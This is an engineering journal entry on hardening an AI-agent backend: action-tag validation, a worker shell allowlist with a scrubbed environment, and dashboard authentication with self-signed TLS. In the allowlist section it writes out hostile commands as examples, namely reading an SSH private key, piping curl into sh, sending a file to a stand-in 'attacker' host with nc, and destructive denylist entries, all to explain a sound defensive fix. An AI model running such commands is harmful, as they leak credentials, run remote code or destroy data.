---
entry: 2026-09-04
created: 2026-09-04 23:55
type: journal
project: sympose
tags:
  - journal/engineering
  - sympose/architecture
  - adr
  - security
---

# Sympose Engineering Log: Backend Hardening Implementation, Tier 4

> **Date:** Thursday, September 4, 2026 (same day as Tiers 1–3)
> **Topic:** Closing the three decision-blocked findings from the backend
> review — action-dispatch validation, worker shell allowlisting, dashboard
> auth + TLS
> **Participants:** damiro (Lead Architect), Grace (Engineering Partner)
> **Status:** All three decided and implemented. F3 (`sqlite_fts` indexed
> search) remains the only unblocked-but-deferred item from the original
> review.

---

## 1. Executive Summary

Follow-up to the same-day
[Tiers 1–3 implementation](./2026-09-04_backend-hardening-implementation.md),
closing the three items that pass left explicitly undecided: ADR-071's
dispatch-mechanism choice, ADR-073's worker shell-allowlist option, and
ADR-064's full auth pass. All three were decided and shipped in one pass
rather than one at a time, at damiro's request.

---

## 2. What shipped

### ADR-071 — action dispatch: decided as light B, not A

Re-reading the actual code path (rather than trusting the prior session's own
framing) showed **no action in the current product gates the visible
answer** — the primary agent's prose streams to the user before any action
tag executes, `SPAWN_WORKER` included; its result appends as a trailing
badge, never re-injected into the answer. The "answer-gating" category
ADR-071's first Implementation Note flagged as a live candidate turned out to
have zero members today. Migrating to function calling (option A) would
therefore spend a round-trip the product doesn't need — rejected outright
against the round-trip-frugal north star, not deferred.

What was a real gap: a recognized tag with the wrong shape (`[WRITE_NOTE:
filename]` with no `|content`, an empty `[READ_NOTE:]`, malformed
`CREATE_PERSONA` YAML) silently did nothing — no badge, no error — leaving
the model with no signal to distinguish that from success. `execute_actions`
now falls through to an explicit `⚠️ Malformed [TAG] — ignored` badge for
every unhandled shape. This is the "delete the guesswork" half of option B,
without touching the bracket-tag delimiter itself — no second real-world
DSL/prose collision has shown up to justify that larger, more disruptive
change (it touches every persona soul-file's tag examples).

### ADR-073 — worker native-shell allowlist: option A + both independents

`NativeTools.execute("run_command", …)`'s guard was a 3-string denylist
(`rm -rf /`, `mkfs`, the fork-bomb literal) plus a regex that only checked
for sibling-vault-folder names — nothing stopped `cat ~/.ssh/id_rsa`, `curl
… | sh`, or `git push`. Replaced with:

- **argv[0] allowlist** (`worker.shell_allowlist` in config.yaml, default:
  read/inspect commands only — `ls`, `cat`, `grep`, `find`, `git`, `head`,
  `tail`, `wc`, `sort`, `diff`, `stat`, `which`, `env`, …). Deviates from the
  ADR's literal wording — instead of rejecting `|`/`&&`/`;` outright and
  requiring an explicit wrapper for compound commands, the command line is
  split on those operators and **every segment's** argv[0] is checked, so
  `git log | head` just works and `cat file | nc attacker 1234` is blocked
  because `nc` isn't listed. Resolves the ADR's own noted cost (compound
  commands needing a wrapper) with less new syntax, at the cost of a
  best-effort rather than shell-grammar-exact operator split.
- **Scrubbed subprocess environment** (`_scrubbed_env()`): only `PATH`,
  `HOME`, `LANG`, `LC_ALL`, `USER`, `SHELL`, `TERM`, `TMPDIR`, `PWD`, and
  `GIT_*` reach the subprocess — every provider API key, Slack token, and any
  `AWS_*`/`SSH_*` credential is withheld regardless of which command runs.
- 073.1 (`realpath` in `is_safe_path`) had already shipped under Tier 1 (F15).

Option A was chosen over B (off-by-default flag) because a read/inspect-only
default allowlist already delivers B's actual goal — zero attack surface for
destructive commands and credential exfiltration by default — without
disabling the worker's real job the way a blanket off-switch would.

### ADR-064 — dashboard auth + TLS: both halves implemented

- **Password guard (064.1)**, built as **HTTP Basic Auth**
  (`sympose/auth.py`), not the signed session-cookie this ADR originally
  sketched. `DASHBOARD_PASSWORD` gates every route via one global FastAPI
  dependency (`/`, `/docs`, every `/api/*` route — not route-by-route). If
  unset on first boot, Sympose generates one, persists it to the workspace
  `.env`, and logs it once — zero-maintenance by default (ADR-020) means no
  manual step, not that auth ships open. The browser caches the credential
  for the tab's life, so there's no session store or cookie signer to write
  or maintain — a smaller mechanism for the same single-user threat model,
  the same kind of deliberate deviation as ADR-072.3's semaphore pool.
- **Self-signed TLS (064.2)**, built with `cryptography` (now a real
  dependency) exactly as proposed: a cert generated in-process on first boot
  into `<workspace>/.certs/` (gitignored), no external `openssl`/`mkcert`
  binary, no OS trust-store mutation. Falls back to plain HTTP with a warning
  if `cryptography` isn't installed, rather than failing to boot.
  `SYMPOSE_DASHBOARD_TLS=0` opts out for anyone terminating TLS externally.
- Verified end-to-end: booted the real dashboard against a scratch
  workspace, `curl` without credentials over `https://127.0.0.1` → `401`,
  with `-u sympose:<generated password>` → `200` — cert, generated password,
  and auth dependency all exercised together, not just unit-tested in
  isolation.

`.venv/bin/pytest` — 118/118 (105 prior + 13 new: `test_auth.py`,
`test_native_tools.py`, plus 3 added to `test_actions.py`).

---

## 3. Decisions made this pass

- **ADR-071**: light B, decided. No answer-gating action exists in the
  current product; option A (function calling) is rejected against the
  round-trip-frugal north star rather than deferred. The delimiter-hardening
  half of option B is deferred until a real collision is observed.
- **ADR-073**: option A, decided, plus both independents (073.1, 073.2).
- **ADR-064**: both halves built. 064.1 implemented as HTTP Basic Auth
  instead of the originally-sketched cookie session — smaller mechanism, same
  guarantee, documented as a deviation the same way ADR-072.3 was.

---

## 4. Commits

Four commits on `chore/backend-architecture-review-and-fixes` (same branch as
Tiers 1–3; author `damiro <hello.damiro@gmail.com>`, no AI attribution
trailer per the repository's standing hygiene rule):

```
7d28a60 fix(actions): surface malformed action-tag badges instead of silent no-ops
1656e1f security(worker): argv[0] shell allowlist + scrubbed subprocess env (ADR-073)
4320300 feat(dashboard): HTTP Basic auth guard + self-signed TLS (ADR-064)
8406d74 docs: accept ADR-071/073/064, journal the Tier 4 implementation
```

## 5. Next Immediate Objective

All three Tier-4 decision points are closed. The only remaining item from the
original review is **F3 (`sqlite_fts` indexed search tier)** — unblocked,
sizable, explicitly deferred to a larger block of time.
